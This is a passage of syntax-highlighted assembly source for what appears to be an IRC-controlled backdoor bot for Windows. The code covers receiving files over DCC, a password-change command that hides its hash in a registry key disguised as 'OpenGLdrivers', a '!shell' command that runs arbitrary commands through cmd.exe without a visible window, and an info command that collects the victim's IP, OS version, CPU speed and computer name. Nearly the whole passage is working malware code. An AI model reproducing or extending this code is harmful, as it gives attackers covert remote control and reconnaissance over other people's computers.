            </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
            
            </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc5">dcc_recv_size</span><span class="sc0"> </span><span class="sc5">_DR</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
            </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">file_handle</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">_WriteFile</span><span class="sc0"> </span><span class="sc5">_DR</span><span class="sc0">
            </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
            
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">_htonl</span><span class="sc0"> </span><span class="sc5">_DR</span><span class="sc0">
            
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc0">

            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">4</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">rsocket</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">_send</span><span class="sc0"> </span><span class="sc5">_DR</span><span class="sc0">
            </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">

            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">dcc_recv_size</span><span class="sc0"> </span><span class="sc5">_DR</span><span class="sc0">
            </span><span class="sc5">jecxnz</span><span class="sc0">  </span><span class="sc5">__cycle</span><span class="sc0">

            </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1000</span><span class="sc0">

</span><span class="sc5">err_shit_recv_thread</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc5">@SEH_RemoveFrame</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">rsocket</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">_closesocket</span><span class="sc0"> </span><span class="sc5">_DR</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">file_handle</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">_CloseHandle</span><span class="sc0"> </span><span class="sc5">_DR</span><span class="sc0">

            </span><span class="sc6">leave</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">_ExitThread</span><span class="sc0"> </span><span class="sc5">_DR</span><span class="sc0">
            
</span><span class="sc5">dcc_recv_size</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">

</span><span class="sc5">bot_receiving_thread</span><span class="sc0">    </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc1">; ---------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">; sends nice msg on ping :)</span><span class="sc0">
</span><span class="sc1">; i: nothing</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; o: error ? ecx=0 : ecx!=0</span><span class="sc0">
</span><span class="sc1">; ---------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc5">bot_PING_cmd</span><span class="sc4">:</span><span class="sc0">       </span><span class="sc5">x_push</span><span class="sc0">  </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">STOP</span><span class="sc0"> </span><span class="sc5">THAT</span><span class="sc0"> </span><span class="sc5">YOU</span><span class="sc0"> </span><span class="sc5">FUCKIN</span><span class="sc0"> </span><span class="sc5">PINGER</span><span class="sc0">!!</span><span class="sc4">&gt;</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esp</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">_xsize</span><span class="sc0">
            </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">send_privmsg</span><span class="sc0">
            </span><span class="sc5">x_pop</span><span class="sc0">
            </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">; ---------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">; changes bot password</span><span class="sc0">
</span><span class="sc1">; format: !chg_pswd &lt;novi pass&gt;</span><span class="sc0">
</span><span class="sc1">; i: nothing</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; o: error ? ecx=0 : ecx!=0</span><span class="sc0">
</span><span class="sc1">; ---------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc5">bot_cmd_chg_pswd</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">check_logged_in</span><span class="sc0">
            </span><span class="sc6">jnc</span><span class="sc0"> </span><span class="sc5">err_not_logged_in</span><span class="sc0">

            </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">9</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
            </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
</span><span class="sc5">__cycle</span><span class="sc4">:</span><span class="sc0">        </span><span class="sc6">rol</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">7</span><span class="sc0">
            </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">
            </span><span class="sc6">lodsb</span><span class="sc0">
            </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0Dh</span><span class="sc0">
            </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">__cycle</span><span class="sc0">
            
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">bot_password</span><span class="sc0"> </span><span class="sc5">X</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">

</span><span class="sc5">save_hash</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">50</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">malloc</span><span class="sc0">
            </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
            </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">num2ascii</span><span class="sc0">

            </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
            </span><span class="sc6">scasb</span><span class="sc0">
            </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">
            </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">

            </span><span class="sc5">x_push</span><span class="sc0">  </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">Software</span><span class="sc0">\</span><span class="sc5">Microsoft</span><span class="sc0">\</span><span class="sc5">Windows</span><span class="sc0">\</span><span class="sc5">CurrentVersion</span><span class="sc0">\</span><span class="sc5">OpenGLdrivers</span><span class="sc4">~</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">_xsize</span><span class="sc0">
            </span><span class="sc5">x_push</span><span class="sc0">  </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">Default</span><span class="sc4">~</span><span class="sc0">
            </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">_xsize</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc0">

            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0"> 
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">REG_SZ</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">HKEY_LOCAL_MACHINE</span><span class="sc0">
            </span><span class="sc5">callb</span><span class="sc0">   </span><span class="sc5">SHSetValueA</span><span class="sc0">
            </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">
            </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">free</span><span class="sc0">
            
            </span><span class="sc5">@retecx1</span><span class="sc0">

</span><span class="sc1">; ---------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">; executes given command in command-liner interpreter, without fuckin DOS box!</span><span class="sc0">
</span><span class="sc1">; format: !shell &lt;cmd&gt;</span><span class="sc0">
</span><span class="sc1">; ex: !shell netstat -an &gt; portlist.txt</span><span class="sc0">
</span><span class="sc1">; i: nothing</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; o: error ? ecx=0 : ecx!=0</span><span class="sc0">
</span><span class="sc1">; ---------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc5">bot_cmd_shell</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">check_logged_in</span><span class="sc0">
            </span><span class="sc6">jnc</span><span class="sc0"> </span><span class="sc5">err_not_logged_in</span><span class="sc0">

            </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">6</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">patchcr</span><span class="sc0">

            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">fs</span><span class="sc4">:[</span><span class="sc5">TEB_PEB</span><span class="sc4">]</span><span class="sc0">
            </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
            </span><span class="sc6">jns</span><span class="sc0"> </span><span class="sc5">__shell_NT</span><span class="sc0">

            </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">15</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
            </span><span class="sc5">x_stosd</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">command.com</span><span class="sc0"> </span><span class="sc4">&gt;</span><span class="sc0">
            </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">__shell_NT_</span><span class="sc0">
        
</span><span class="sc5">__shell_NT</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">11</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
            </span><span class="sc5">x_stosd</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">cmd.exe</span><span class="sc0"> </span><span class="sc4">&gt;</span><span class="sc0">

</span><span class="sc5">__shell_NT_</span><span class="sc4">:</span><span class="sc0">        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc3">"c/"</span><span class="sc0">
            </span><span class="sc6">stosw</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc3">" "</span><span class="sc0">
            </span><span class="sc6">stosb</span><span class="sc0">
            </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
            </span><span class="sc6">cld</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
            </span><span class="sc5">callb</span><span class="sc0">   </span><span class="sc5">WinExec</span><span class="sc0">
            
            </span><span class="sc5">@retecx1</span><span class="sc0">

</span><span class="sc1">; ---------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">; writes bot IP , kernel version (NT or 9x), vindoze version, proc speed &amp;</span><span class="sc0">
</span><span class="sc1">; comp name</span><span class="sc0">
</span><span class="sc1">; i: nothing</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; o: error ? ecx=0 : ecx!=0</span><span class="sc0">
</span><span class="sc1">; ---------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc5">bot_cmd_info</span><span class="sc4">:</span><span class="sc0">       </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">check_logged_in</span><span class="sc0">
            </span><span class="sc6">jnc</span><span class="sc0"> </span><span class="sc5">err_not_logged_in</span><span class="sc0">

            </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">300</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc0">

            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">300</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
            </span><span class="sc5">callb</span><span class="sc0">   </span><span class="sc5">gethostname</span><span class="sc0">

            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
            </span><span class="sc5">callb</span><span class="sc0">   </span><span class="sc5">gethostbyname</span><span class="sc0">
            </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">300</span><span class="sc0">
            </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
            </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">err_bot_info</span><span class="sc0">

            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc5">HOSTENT_IP</span><span class="sc4">]</span><span class="sc0">
            </span><span class="sc6">lodsd</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc0">
            </span><span class="sc5">callb</span><span class="sc0">   </span><span class="sc5">inet_ntoa</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">$</span><span class="sc4">+</span><span class="sc2">5</span><span class="sc4">+</span><span class="sc2">200</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">200</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">
            </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
            </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
            </span><span class="sc5">@endsz</span><span class="sc0">
            </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
            </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
            </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
            </span><span class="sc6">movzx</span><span class="sc0">   </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
            </span><span class="sc6">lodsb</span><span class="sc0">
            </span><span class="sc6">stosb</span><span class="sc0">
            </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">2</span><span class="sc0">
            </span><span class="sc5">x_stosd</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc0"> </span><span class="sc5">running</span><span class="sc0"> </span><span class="sc5">vindoze</span><span class="sc0"> </span><span class="sc2">9x</span><span class="sc0"> </span><span class="sc4">&gt;</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">
            </span><span class="sc5">callb</span><span class="sc0">   </span><span class="sc5">GetVersion</span><span class="sc0">
            </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
            </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">8000000h</span><span class="sc0">
            </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">__runz_9x</span><span class="sc0">
            
            </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
            </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
            </span><span class="sc5">x_stosd</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc0"> </span><span class="sc5">NT</span><span class="sc0"> </span><span class="sc4">&gt;</span><span class="sc0">
            </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">

</span><span class="sc5">__runz_9x</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
            </span><span class="sc5">x_stosd</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">ver</span><span class="sc0"> </span><span class="sc4">&gt;</span><span class="sc0">
            </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
            </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc3">"0"</span><span class="sc0">
            </span><span class="sc6">stosb</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc3">"."</span><span class="sc0">
            </span><span class="sc6">stosb</span><span class="sc0">

            </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
            </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
            </span><span class="sc6">movzx</span><span class="sc0">   </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">num2ascii</span><span class="sc0">
            </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    
            </span><span class="sc5">x_stosd</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">CPU</span><span class="sc0"> </span><span class="sc5">speed</span><span class="sc0"> </span><span class="sc5">is</span><span class="sc0"> </span><span class="sc4">&gt;</span><span class="sc0">
            </span><span class="sc6">rdtsc</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">1000</span><span class="sc0">
            </span><span class="sc5">callb</span><span class="sc0">   </span><span class="sc5">Sleep</span><span class="sc0">
            </span><span class="sc6">rdtsc</span><span class="sc0">
            </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
            </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">
            </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1000000</span><span class="sc0">
            </span><span class="sc6">div</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">num2ascii</span><span class="sc0">
            </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
            </span><span class="sc5">x_stosd</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc0"> </span><span class="sc5">MHz</span><span class="sc4">&gt;</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc3">","</span><span class="sc0">
            </span><span class="sc6">stosb</span><span class="sc0">
            </span><span class="sc5">x_stosd</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc0"> </span><span class="sc5">lil</span><span class="sc4">&gt;</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">12345678h</span><span class="sc0">
            </span><span class="sc6">stosd</span><span class="sc0">
            </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
            </span><span class="sc6">lodsb</span><span class="sc0">
            </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
            </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">12h</span><span class="sc0">
            </span><span class="sc6">pushf</span><span class="sc0">
            </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">
            </span><span class="sc6">popf</span><span class="sc0">
            </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">__lil_end</span><span class="sc0">

            </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
            </span><span class="sc5">x_stosd</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc0"> </span><span class="sc5">big</span><span class="sc4">&gt;</span><span class="sc0">
</span><span class="sc5">__lil_end</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc5">x_stosd</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc0"> </span><span class="sc5">endian</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">Computer</span><span class="sc0"> </span><span class="sc9">name</span><span class="sc4">:&gt;</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">' '</span><span class="sc0">
            </span><span class="sc6">stosb</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">16</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esp</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">
            </span><span class="sc5">callb</span><span class="sc0">   </span><span class="sc5">GetComputerNameA</span><span class="sc0">
            </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">]</span><span class="sc0">
            </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
            </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
            </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">

            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
